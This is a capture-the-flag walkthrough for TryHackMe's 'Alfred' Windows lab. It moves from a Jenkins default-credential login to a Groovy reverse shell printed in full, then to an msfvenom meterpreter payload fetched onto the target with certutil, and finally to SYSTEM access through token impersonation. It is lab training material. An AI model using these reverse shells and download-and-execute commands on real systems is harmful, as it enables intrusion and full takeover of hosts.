# **Alfred**

![alt text](https://i.imgur.com/UT3gAsE.png "Alfred Logo")

*Plateform* - [**TryHackMe**](https://www.tryhackme.com/room/alfred)

*OS* - **Windows**

*Rating* - **Easy**

*Because even The Batcave has security issues.*

## **Step 1 : RECONNAISSANCE**

### *Looking at the website*

Traveling to `alfred.thm`, we can notice a simple index page that mentions some flavor text regarding Bruce Wayne. There isn't anything interesting hidden within the HTML.

## **Step 2 : SCANNING AND ENUMERATION**

### *Nmap Output*

The nmap scan was the following: `nmap -A -T4 -oN alfred_top1000 -v -Pn 10.10.238.116`

The reason why I added the `-Pn` tag was because it is mentioned the machine did not respond to pings (ICMP was disabled). That way, we skipped host discovery and considered all hosts as online.

![alt text](https://i.imgur.com/ddICCwo.png "nmap output")

### *Port 80 -- HTTP*

Port 80 is the port we visited during reconnaissance (see step 1). There isn't anything interesting running here. While this would be good practice to use a directory buster on this port, I skipped this step for this walkthrough as the main target is port 8080.

### *Port 8080 -- HTTP*

This is where it gets interesting. Port 8080 hosts a Jenkins server (which seems to be in line with the box's theme) and prompts us for login credentials.

![alt text](https://i.imgur.com/GSeLxcT.png "Jenkins Login Page")

I attempted to use the [default passwords for Jenkins](https://docs.openshift.com/container-platform/3.3/using_images/other_images/jenkins.html), `admin:password`, but it didn't let me in. However, the credentials `admin:admin` worked and we managed to get on the Jenkins admin's dashboard!

After enumerating the various panes and options, we found a *Script Console* that lets us execute code on the server. It seems to be a nice way to get in! 

Here is how to find it:

#### Accessing the "Manage Jenkins" Pane

On the left side, you'll see the side menu. Select `Manage Jenkins`.

![alt text](https://i.imgur.com/FceoyID.png "Manage Jenkins")

#### Accessing the "Script Console"

From here, scroll down until you see the `Script Console`.

![alt text](https://i.imgur.com/lnfwsqT.png "Script console")

That's it! See **Step 3: Exploitation** to learn how to exploit this in order to get a reverse shell.

### *Port 3389 -- RDP*

Roughly, RDP is to Windows what SSH is to Linux. While it is great to take a note of its presence, it usually won't be a way in. At least not directly.

## **Step 3 : EXPLOITATION**

As previously mentioned, we found a script console that lets us execute **Groovy scripts** on the server. This will be our focus in order to get a reverse shell.

### *Finding a Groovy script reverse shell*

Using one of my favorite resource, [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy), we found a reverse shell script!

Here is the code:

```
String host="YOUR_TUN0";
int port=YOUR_LPORT;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Awesome! We found a reverse shell. Simply fill this script by providing your `LHOST` and `LPORT`.

Here's how it should look like:

![alt text](https://i.imgur.com/w749m0p.png "Script Example")

**Don't run the script yet! Let's set up a netcat listener first.**

### *Set up your netcat listener*

This step is quite straight forward. Open up a new terminal tab and enter the following command:

`nc -nvlp YOUR_LPORT`

### *Run the script and get your reverse shell*

As the title says, press `Run` on the script console and wait for the reverse shell to come in!

![alt text](https://i.imgur.com/9Tdt4iG.png "We are in!")

Bingo! We are in as Bruce, a low privileged user and got the user flag!

![alt text](https://i.imgur.com/LPBoY00.png "user.txt proof")

## **Step 4 : POST-EXPLOITATION**

### *Basic enumeration*

After unsuccessfully attempting to run both winPEAS.exe and PowerUp.ps1, I resorted to manual checks. The privesc way seems to be to impersonate a token by abusing the SeImpersonatePrivilege, which allows us to do **token impersonation**:

![alt text](https://i.imgur.com/ym1KHfU.png "Running whomami /priv")

### *Upgrading our shell*

Before we attempt to privesc, and in line with the box's page, let's upgrade our shell.

#### Create the malicious executable

On the attacker VM, run the following command:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai  LHOST=[YOUR_TUN0] LPORT=[PORT] -f exe -o revshell.exe`

Since we don't want conflicting ports, make sure to use a **different LPORT** than the one you used for the initial reverse shell.

#### Setting up the multi/handler listener

1. Open up metasploit (`msfconsole`)
2. `use multi/handler`
3. Set up the options (`LHOST`, `LPORT`)
4. Set up the payload (`set payload windows/meterpreter/reverse_tcp`)
5. Run it! `run`

#### Get the malicious executable on the target machine and execute it

Put your newly created `revshell.exe` in an appropriate directory. Then, spin up a webserver (`python -m SimpleHTTPServer 80`) from that directory.

Next, get back to your shell as Bruce and cd to his desktop : `cd c:\Users\bruce\Desktop`. This way, we are sure he has rwx rights.

Now, get the malicious executable on this machine! `certutil -urlcache -f http://<YOUR_TUN0>/revshell.exe revshell.exe`.

Execute it! Run `revshell.exe`.

You should now have a meterpreter shell.

![alt text](https://i.imgur.com/FTZ3tbb.png "Meterpretter session opened")

> Note: I had forgotten to set up the payload properly, hence the multiple attempts :)

### *Privesc using Token Impersonation*

Let's privesc, shall we? We already know we can impersonate tokens, so let's focus on that!

First, let's `load incognito`. This way, we will be able to see tokens using `list_tokens -u`.

![alt text](https://i.imgur.com/sP7Bvsl.png "Tokens overview")

As we can see, it is possible to impersonate NT Authority\System, a.k.a. get root.

![alt text](blob:https://imgur.com/9371467c-97a3-4b5f-be2c-150c637ed2d6 "Rooted!")

There we go, we are root! However, we aren't out of the woods yet.

### *Getting the root flag*

#### Migrating to a better process

We first need to migrate our process. The box's page does a better job than me at explaining why we should migrate our process to one owned by NT Authority\System:

> Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). [Source - TryHackMe](https://tryhackme.com/room/alfred)

Let's get a list of the processes by typing `ps`:

![alt text](https://i.imgur.com/50MTYro.png "Processes list")

The `services.exe` process is more stable than the other ones, hence why I highlighted it. To migrate to it, type:

`migrate [PID]` or, in our case,  `migrate 668`.

#### Getting the root flag

Now that we have a good process and we are admin, getting the root flag is easy. According to the box's page, it can be found in `c:\Windows\System32\config`.

Let's get the flag:

`cd c:\Windows\System32\config\`
`type root.txt`

We have the flag and **PWNED the box**!

![alt text](https://i.imgur.com/9xedFSj.png "root.txt proof")

## **SUMMARY**

This box was very interesting and showed us a couple of nice concepts: 

1. Don't limit yourself on attempting only default credentials : enumerate more and try common combinations.

2. Knowing basic manual enumeration is key. Sometimes scripts won't work and **knowing what your scripts do is key**.

3. Upgrading shells can be useful.

# **That's it for now. Thank you for reading this write-up!**

### **Vonshad**
